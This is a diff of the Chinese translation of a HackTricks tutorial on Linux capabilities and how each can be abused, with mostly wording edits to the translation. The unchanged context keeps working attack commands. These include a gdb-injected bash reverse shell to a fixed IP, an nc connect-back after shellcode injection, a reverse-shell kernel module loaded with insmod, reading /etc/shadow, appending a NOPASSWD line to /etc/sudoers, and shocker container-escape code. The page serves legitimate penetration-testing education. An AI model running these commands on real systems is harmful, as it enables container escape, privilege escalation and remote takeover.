@@ -2,6 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 ## Linux Capabilities
 
 Linux capabilities 将 **root 权限划分为更小、独立的单元**，允许进程拥有一部分权限。这通过不必要地授予完全的 root 权限来最小化风险。
@@ -12,34 +13,34 @@ Linux capabilities 将 **root 权限划分为更小、独立的单元**，允许
 
 ### 权限集：
 
-1. **Inherited (CapInh)**：
+1. **继承 (CapInh)**：
 
 - **目的**：确定从父进程传递下来的能力。
 - **功能**：当创建新进程时，它从其父进程继承此集合中的能力。对于在进程生成中维护某些权限非常有用。
 - **限制**：进程不能获得其父进程未拥有的能力。
 
-2. **Effective (CapEff)**：
+2. **有效 (CapEff)**：
 
 - **目的**：表示进程在任何时刻实际使用的能力。
 - **功能**：这是内核检查以授予各种操作权限的能力集合。对于文件，这个集合可以是一个标志，指示文件的允许能力是否被视为有效。
 - **重要性**：有效集合对于即时权限检查至关重要，充当进程可以使用的活动能力集合。
 
-3. **Permitted (CapPrm)**：
+3. **允许 (CapPrm)**：
 
 - **目的**：定义进程可以拥有的最大能力集合。
-- **功能**：进程可以将权限集合中的能力提升到其有效集合，从而使其能够使用该能力。它还可以从其权限集合中删除能力。
-- **边界**：它作为进程可以拥有的能力的上限，确保进程不会超出其预定义的权限范围。
+- **功能**：进程可以将允许集合中的能力提升到其有效集合，从而使其能够使用该能力。它也可以从其允许集合中删除能力。
+- **边界**：它作为进程可以拥有的能力的上限，确保进程不会超过其预定义的权限范围。
 
-4. **Bounding (CapBnd)**：
+4. **边界 (CapBnd)**：
 
 - **目的**：对进程在其生命周期内可以获得的能力设置上限。
-- **功能**：即使进程在其可继承或允许的集合中具有某种能力，除非它也在边界集合中，否则无法获得该能力。
+- **功能**：即使进程在其可继承或允许集合中具有某种能力，除非它也在边界集合中，否则无法获得该能力。
 - **用例**：此集合特别有助于限制进程的权限提升潜力，增加额外的安全层。
 
-5. **Ambient (CapAmb)**：
+5. **环境 (CapAmb)**：
 - **目的**：允许某些能力在 `execve` 系统调用中保持，这通常会导致进程能力的完全重置。
-- **功能**：确保没有相关文件能力的非 SUID 程序可以保留某些权限。
-- **限制**：此集合中的能力受可继承和允许集合的约束，确保它们不会超出进程的允许权限。
+- **功能**：确保没有关联文件能力的非 SUID 程序可以保留某些权限。
+- **限制**：此集合中的能力受可继承和允许集合的约束，确保它们不会超过进程的允许权限。
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -100,7 +101,7 @@ CapAmb:    0000000000000000
 capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-虽然这样可以工作，但还有另一种更简单的方法。要查看正在运行的进程的能力，只需使用 **getpcaps** 工具，后面跟上其进程 ID (PID)。您还可以提供一个进程 ID 列表。
+虽然这有效，但还有另一种更简单的方法。要查看正在运行的进程的能力，只需使用 **getpcaps** 工具，后跟其进程 ID (PID)。您还可以提供进程 ID 的列表。
 ```bash
 getpcaps 1234
 ```
@@ -123,7 +124,7 @@ $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
 如您所见，给定的能力与获取二进制文件能力的两种方法的结果相对应。\
-_getpcaps_ 工具使用 **capget()** 系统调用查询特定线程的可用能力。此系统调用只需提供 PID 即可获取更多信息。
+_getpcaps_ 工具使用 **capget()** 系统调用查询特定线程的可用能力。此系统调用只需要提供 PID 以获取更多信息。
 
 ### 二进制文件能力
 
@@ -276,15 +277,15 @@ capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> 你只能**添加在** permitted 和 inheritable 集合中**存在的能力**。
+> 你只能**添加在**允许和继承集合中**存在的能力**。
 
 ### 能力感知/能力无知的二进制文件
 
-**能力感知的二进制文件不会使用环境中提供的新能力**，然而**能力无知的二进制文件会使用**它们，因为它们不会拒绝这些能力。这使得能力无知的二进制文件在一个授予二进制文件能力的特殊环境中变得脆弱。
+**能力感知的二进制文件不会使用环境赋予的新能力**，然而**能力无知的二进制文件会使用**它们，因为它们不会拒绝这些能力。这使得能力无知的二进制文件在一个授予能力的特殊环境中变得脆弱。
 
 ## 服务能力
 
-默认情况下，**以 root 身份运行的服务将被分配所有能力**，在某些情况下这可能是危险的。\
+默认情况下，**以root身份运行的服务将被分配所有能力**，在某些情况下这可能是危险的。\
 因此，**服务配置**文件允许**指定**你希望它拥有的**能力**，**以及**应该执行该服务的**用户**，以避免以不必要的权限运行服务：
 ```bash
 [Service]
@@ -321,7 +322,7 @@ setcap cap_net_raw+ep /sbin/ping
 getcap /sbin/ping
 /sbin/ping = cap_net_raw+ep
 ```
-`+ep` 表示您正在将能力添加为有效和允许（“-”将移除它）。
+`+ep`意味着您正在将能力添加为有效和允许（“-”将删除它）。
 
 要识别系统或文件夹中具有能力的程序：
 ```bash
@@ -355,7 +356,7 @@ getcap /usr/sbin/tcpdump
 
 ## CAP_SYS_ADMIN
 
-**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种非常强大的Linux能力，通常被视为接近root级别，因为它具有广泛的**管理权限**，例如挂载设备或操纵内核特性。虽然对于模拟整个系统的容器来说是不可或缺的，但**`CAP_SYS_ADMIN` 带来了重大的安全挑战**，尤其是在容器化环境中，因为它可能导致特权提升和系统妥协。因此，其使用需要严格的安全评估和谨慎管理，强烈建议在特定应用的容器中放弃此能力，以遵循**最小权限原则**并最小化攻击面。
+**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 是一种强大的Linux能力，通常被视为接近root级别，因为它具有广泛的**管理权限**，例如挂载设备或操纵内核特性。虽然在模拟整个系统的容器中不可或缺，但**`CAP_SYS_ADMIN` 带来了重大的安全挑战**，尤其是在容器化环境中，因为它可能导致特权提升和系统妥协。因此，其使用需要严格的安全评估和谨慎管理，强烈建议在特定应用的容器中放弃此能力，以遵循**最小特权原则**并最小化攻击面。
 
 **带有二进制文件的示例**
 ```bash
@@ -398,7 +399,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-在之前的输出中，您可以看到 SYS_ADMIN 能力已启用。
+在之前的输出中，您可以看到 SYS_ADMIN 权限已启用。
 
 - **挂载**
 
@@ -433,9 +434,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP_SYS_PTRACE
 
-**这意味着您可以通过在主机上运行的某个进程中注入 shellcode 来逃离容器。** 要访问在主机上运行的进程，容器需要至少以 **`--pid=host`** 运行。
+**这意味着您可以通过在主机内部运行的某个进程中注入 shellcode 来逃离容器。** 要访问在主机内部运行的进程，容器需要至少以 **`--pid=host`** 运行。
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的调试和系统调用跟踪功能的能力，以及像 `process_vm_readv(2)` 和 `process_vm_writev(2)` 这样的跨内存附加调用。尽管对于诊断和监控目的非常强大，但如果在没有像 `ptrace(2)` 的 seccomp 过滤器等限制措施的情况下启用 `CAP_SYS_PTRACE`，可能会显著削弱系统安全性。具体来说，它可以被利用来规避其他安全限制，特别是 seccomp 强加的限制，正如 [这样的概念证明 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) 所示。
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 授予使用 `ptrace(2)` 提供的调试和系统调用跟踪功能的能力，以及像 `process_vm_readv(2)` 和 `process_vm_writev(2)` 这样的跨内存附加调用。尽管对于诊断和监控目的非常强大，但如果在没有像 seccomp 过滤器这样的限制措施的情况下启用 `CAP_SYS_PTRACE`，可能会显著削弱系统安全性。具体来说，它可以被利用来规避其他安全限制，特别是 seccomp 强加的限制，正如 [这样的概念证明 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) 所示。
 
 **使用二进制文件的示例 (python)**
 ```bash
@@ -531,7 +532,7 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 **使用二进制的示例 (gdb)**
 
-`gdb` 具有 `ptrace` 权限：
+`gdb` 具有 `ptrace` 能力：
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
@@ -582,16 +583,16 @@ Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
-**带环境的示例（Docker突破） - 另一个gdb滥用**
+**带环境的示例（Docker 突破） - 另一个 gdb 滥用**
 
-如果**GDB**已安装（或者你可以通过`apk add gdb`或`apt install gdb`等方式安装它），你可以**从主机调试一个进程**并使其调用`system`函数。（此技术还需要能力`SYS_ADMIN`）**。**
+如果 **GDB** 已安装（或者你可以通过 `apk add gdb` 或 `apt install gdb` 等安装它），你可以 **从主机调试一个进程** 并使其调用 `system` 函数。（此技术还需要能力 `SYS_ADMIN`）**。**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
 (gdb) call (void)system("sleep 5")
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
-您将无法看到执行命令的输出，但它将由该进程执行（因此获取反向 shell）。
+您将无法看到执行命令的输出，但该进程将执行该命令（因此获取反向 shell）。
 
 > [!WARNING]
 > 如果您收到错误 "No symbol "system" in current context."，请检查通过 gdb 在程序中加载 shellcode 的前一个示例。
@@ -614,8 +615,8 @@ groups=0(root
 列出 **主机** 中运行的 **进程** `ps -eaf`
 
 1. 获取 **架构** `uname -m`
-2. 查找适合该架构的 **shellcode** ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. 查找一个 **程序** 来 **注入** **shellcode** 到进程内存中 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
+2. 查找适用于该架构的 **shellcode** ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+3. 查找一个 **程序** 以 **注入** **shellcode** 到进程内存中 ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
 4. **修改** 程序中的 **shellcode** 并 **编译** 它 `gcc inject.c -o inject`
 5. **注入** 并获取你的 **shell**: `./inject 299; nc 172.17.0.1 5600`
 
@@ -624,7 +625,7 @@ groups=0(root
 **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** 使进程能够 **加载和卸载内核模块 (`init_module(2)`、`finit_module(2)` 和 `delete_module(2)` 系统调用)**，提供对内核核心操作的直接访问。此能力带来了严重的安全风险，因为它允许特权升级和完全系统妥协，通过允许对内核的修改，从而绕过所有 Linux 安全机制，包括 Linux 安全模块和容器隔离。
 **这意味着你可以** **在主机的内核中插入/移除内核模块。**
 
-**带二进制文件的示例**
+**带有二进制文件的示例**
 
 在以下示例中，二进制文件 **`python`** 拥有此能力。
 ```bash
@@ -637,7 +638,7 @@ getcap -r / 2>/dev/null
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-然后**编译内核模块，您可以在下面找到 2 个示例并将其复制**到此文件夹：
+然后**编译内核模块，您可以在下面找到 2 个示例，并将其复制**到此文件夹：
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
@@ -674,7 +675,7 @@ groups=0(root)
 ```
 在之前的输出中，您可以看到 **SYS_MODULE** 权限已启用。
 
-**创建** 将要执行反向 shell 的 **内核模块** 和 **Makefile** 以 **编译** 它：
+**创建** 将执行反向 shell 的 **内核模块** 和 **Makefile** 以 **编译** 它：
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -718,7 +719,7 @@ ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  S
 sudo apt update
 sudo apt full-upgrade
 ```
-最后，在一个 shell 中启动 `nc`，并从另一个 shell 中 **加载模块**，你将会在 nc 进程中捕获到 shell：
+最后，在一个 shell 中启动 `nc`，然后从另一个 shell 中 **加载模块**，你将会在 nc 进程中捕获到 shell：
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -732,7 +733,7 @@ insmod reverse-shell.ko #Launch the reverse shell
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 使进程能够 **绕过读取文件和读取及执行目录的权限**。它的主要用途是用于文件搜索或读取。然而，它还允许进程使用 `open_by_handle_at(2)` 函数，该函数可以访问任何文件，包括那些在进程的挂载命名空间之外的文件。在 `open_by_handle_at(2)` 中使用的句柄应该是通过 `name_to_handle_at(2)` 获得的非透明标识符，但它可以包含易受篡改的敏感信息，如 inode 号。该能力的潜在利用，特别是在 Docker 容器的上下文中，已由 Sebastian Krahmer 通过 shocker 漏洞进行了演示，分析见 [这里](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 使进程能够 **绕过读取文件和读取及执行目录的权限**。它的主要用途是用于文件搜索或读取。然而，它还允许进程使用 `open_by_handle_at(2)` 函数，该函数可以访问任何文件，包括那些在进程的挂载命名空间之外的文件。在 `open_by_handle_at(2)` 中使用的句柄应该是通过 `name_to_handle_at(2)` 获得的非透明标识符，但它可以包含易受篡改的敏感信息，如 inode 号。该能力的潜在利用，特别是在 Docker 容器的上下文中，已被 Sebastian Krahmer 通过 shocker 漏洞演示，如 [这里](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) 分析的那样。
 **这意味着您可以** **绕过文件读取权限检查和目录读取/执行权限检查。**
 
 **带有二进制文件的示例**
@@ -757,7 +758,7 @@ print(filename)
 ```python
 print(open("/etc/shadow", "r").read())
 ```
-**示例环境（Docker 逃逸）**
+**在环境中的示例（Docker 逃逸）**
 
 您可以使用以下命令检查 Docker 容器内启用的能力：
 ```
@@ -937,7 +938,7 @@ return 0;
 
 **这意味着您可以绕过对任何文件的写入权限检查，因此您可以写入任何文件。**
 
-有很多文件您可以 **覆盖以提升权限，** [**您可以从这里获取想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
+有很多文件您可以 **覆盖以提升权限，** [**您可以从这里获取灵感**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
 **使用二进制文件的示例**
 
@@ -956,7 +957,7 @@ file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
-**示例：环境 + CAP_DAC_READ_SEARCH（Docker 逃逸）**
+**带环境的示例 + CAP_DAC_READ_SEARCH (Docker 逃逸)**
 
 您可以使用以下命令检查 Docker 容器内启用的能力：
 ```bash
@@ -971,8 +972,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-首先阅读上一节 [**滥用 DAC_READ_SEARCH 能力以读取任意文件**](linux-capabilities.md#cap_dac_read_search) 的内容，并 **编译** 漏洞利用代码。\
-然后，**编译以下版本的 shocker 漏洞利用代码**，这将允许您在主机文件系统中 **写入任意文件**：
+首先阅读上一节中[**滥用 DAC_READ_SEARCH 能力以读取任意文件**](linux-capabilities.md#cap_dac_read_search)的内容，并**编译**漏洞利用代码。\
+然后，**编译以下版本的 shocker 漏洞利用代码**，这将允许您在主机文件系统中**写入任意文件**：
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1113,7 +1114,7 @@ return 0;
 ```
 为了逃离 docker 容器，你可以 **下载** 主机上的文件 `/etc/shadow` 和 `/etc/passwd`，**添加** 一个 **新用户**，并使用 **`shocker_write`** 来覆盖它们。然后，通过 **ssh** **访问**。
 
-**该技术的代码来自于“滥用 DAC_OVERRIDE 能力”的实验室** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
+**该技术的代码来自于“滥用 DAC_OVERRIDE 能力”实验室** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)
 
 ## CAP_CHOWN
 
@@ -1223,7 +1224,7 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> 注意，如果您使用 CAP_SETFCAP 为二进制文件设置了新的能力，您将失去此能力。
+> 请注意，如果您使用 CAP_SETFCAP 为二进制文件设置新能力，您将失去此能力。
 
 一旦您拥有 [SETUID capability](linux-capabilities.md#cap_setuid)，您可以查看其部分以了解如何提升权限。
 
@@ -1242,7 +1243,7 @@ capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
 这个能力允许**将任何其他能力赋予二进制文件**，因此我们可以考虑**利用此页面提到的其他能力突破**来**逃逸**容器。\
-然而，如果你尝试将能力 CAP_SYS_ADMIN 和 CAP_SYS_PTRACE 赋予 gdb 二进制文件，你会发现你可以赋予它们，但**二进制文件在此之后将无法执行**：
+然而，如果你尝试例如将能力 CAP_SYS_ADMIN 和 CAP_SYS_PTRACE 赋予 gdb 二进制文件，你会发现你可以赋予它们，但**二进制文件在此之后将无法执行**：
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1252,7 +1253,7 @@ setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb
 /usr/bin/gdb
 bash: /usr/bin/gdb: Operation not permitted
 ```
-[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 这是一个**有效能力的限制超集**，线程可以假定它。它也是一个限制超集，线程可以将其**有效集**中没有CAP_SETPCAP能力的能力添加到可继承集。_\
+[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 这是一个**有效能力的限制超集**，线程可以假设它。它也是一个限制超集，线程可以将其**不具有CAP_SETPCAP**能力的有效集添加到可继承集。_\
 看起来Permitted能力限制了可以使用的能力。\
 然而，Docker默认也授予**CAP_SETPCAP**，因此您可能能够**在可继承的能力中设置新能力**。\
 然而，在此能力的文档中：_CAP_SETPCAP : \[…] **将调用线程的边界**集中的任何能力添加到其可继承集。_\
@@ -1278,9 +1279,9 @@ import signal
 pgid = os.getpgid(341)
 os.killpg(pgid, signal.SIGKILL)
 ```
-**使用 kill 提权**
+**使用 kill 进行权限提升**
 
-如果你拥有 kill 权限，并且有一个 **以 root 身份运行的 node 程序**（或以其他用户身份运行），你可以 **发送** 给它 **信号 SIGUSR1**，使其 **打开 node 调试器**，以便你可以连接。
+如果你拥有 kill 权限，并且有一个 **以 root 身份运行的 node 程序**（或以其他用户身份运行），你可以 **发送** 给它 **信号 SIGUSR1**，使其 **打开 node 调试器**，你可以在此连接。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1293,7 +1294,7 @@ electron-cef-chromium-debugger-abuse.md
 
 **这意味着可以在任何端口上监听（甚至是特权端口）。** 你不能直接通过这个能力提升特权。
 
-**带二进制的示例**
+**带有二进制的示例**
 
 如果 **`python`** 拥有这个能力，它将能够在任何端口上监听，甚至可以从它连接到任何其他端口（某些服务需要从特定特权端口进行连接）
 
@@ -1323,7 +1324,7 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 能力允许进程 **创建 RAW 和 PACKET 套接字**，使它们能够生成和发送任意网络数据包。这可能导致容器化环境中的安全风险，例如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在没有足够防火墙保护的情况下。此外，**CAP_NET_RAW** 对于特权容器支持通过 RAW ICMP 请求进行的操作（如 ping）至关重要。
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 能力允许进程 **创建 RAW 和 PACKET 套接字**，使它们能够生成和发送任意网络数据包。这可能导致容器化环境中的安全风险，例如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可能利用这一点干扰容器路由或危害主机网络安全，尤其是在没有足够防火墙保护的情况下。此外，**CAP_NET_RAW** 对于特权容器支持通过 RAW ICMP 请求进行 ping 操作至关重要。
 
 **这意味着可以嗅探流量。** 你不能直接通过这个能力提升权限。
 
@@ -1388,7 +1389,7 @@ count=count+1
 
 **带二进制的示例**
 
-假设 **python 二进制文件** 具有这些权限。
+假设 **python 二进制文件** 拥有这些权限。
 ```python
 #Dump iptables filter table rules
 import iptc
@@ -1406,7 +1407,7 @@ iptc.easy.flush_table('filter')
 
 **带有二进制的示例**
 
-如果你发现一个文件是不可变的，并且 python 拥有这个能力，你可以 **移除不可变属性并使文件可修改：**
+如果你发现一个文件是不可变的，并且 python 具有这个能力，你可以 **移除不可变属性并使文件可修改：**
 ```python
 #Check that the file is imutable
 lsattr file.sh
@@ -1450,7 +1451,7 @@ f.write('New content for the file\n')
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离，专门授予使用 `syslog(2)` 调用的能力。此能力使得在 `kptr_restrict` 设置为 1 时，可以通过 `/proc` 和类似接口查看内核地址，该设置控制内核地址的暴露。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，这意味着内核地址被暴露，尽管许多发行版出于安全原因将其设置为 1（隐藏地址，除非来自 uid 0）或 2（始终隐藏地址）。
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离，专门授予使用 `syslog(2)` 调用的能力。此能力使得在 `kptr_restrict` 设置为 1 时，可以通过 `/proc` 和类似接口查看内核地址，该设置控制内核地址的暴露。自 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，这意味着内核地址是暴露的，尽管许多发行版出于安全原因将其设置为 1（隐藏地址，除非来自 uid 0）或 2（始终隐藏地址）。
 
 此外，**CAP_SYSLOG** 允许在 `dmesg_restrict` 设置为 1 时访问 `dmesg` 输出。尽管这些变化，**CAP_SYS_ADMIN** 仍然保留执行 `syslog` 操作的能力，因其历史原因。
 
@@ -1502,11 +1503,11 @@ head /proc/12345/root/dev/sdb
 
 ### CAP_SETPCAP
 
-**CAP_SETPCAP** 使进程能够 **更改另一个进程的能力集**，允许从有效、可继承和允许的集合中添加或删除能力。然而，进程只能修改其在自己允许集合中拥有的能力，确保它无法将另一个进程的权限提升到超出其自身的权限。最近的内核更新收紧了这些规则，限制 `CAP_SETPCAP` 只能减少其自身或其后代的允许集合中的能力，旨在降低安全风险。使用此功能需要在有效集合中拥有 `CAP_SETPCAP`，并在允许集合中拥有目标能力，利用 `capset()` 进行修改。这总结了 `CAP_SETPCAP` 的核心功能和限制，突出了其在权限管理和安全增强中的作用。
+**CAP_SETPCAP** 使进程能够 **更改另一个进程的能力集**，允许从有效、可继承和允许的集合中添加或删除能力。然而，进程只能修改其自身允许集中的能力，确保它无法将另一个进程的权限提升到超出自身的水平。最近的内核更新收紧了这些规则，限制 `CAP_SETPCAP` 仅能减少其自身或其后代的允许集中的能力，旨在降低安全风险。使用此功能需要在有效集内拥有 `CAP_SETPCAP`，并在允许集内拥有目标能力，利用 `capset()` 进行修改。这总结了 `CAP_SETPCAP` 的核心功能和限制，突出了其在权限管理和安全增强中的作用。
 
 **`CAP_SETPCAP`** 是一个 Linux 能力，允许进程 **修改另一个进程的能力集**。它授予从其他进程的有效、可继承和允许能力集中添加或删除能力的能力。然而，使用此能力有某些限制。
 
-拥有 `CAP_SETPCAP` 的进程 **只能授予或移除其自身允许能力集中存在的能力**。换句话说，如果一个进程自己没有某个能力，它就不能将该能力授予另一个进程。这一限制防止了进程将另一个进程的权限提升到超出其自身的权限级别。
+拥有 `CAP_SETPCAP` 的进程 **只能授予或移除其自身允许能力集中的能力**。换句话说，如果一个进程没有某个能力，它不能将该能力授予另一个进程。这一限制防止了进程将另一个进程的权限提升到超出自身的权限级别。
 
 此外，在最近的内核版本中，`CAP_SETPCAP` 能力已被 **进一步限制**。它不再允许进程任意修改其他进程的能力集。相反，它 **仅允许进程降低其自身允许能力集或其后代的允许能力集中的能力**。这一变化是为了减少与能力相关的潜在安全风险。
 
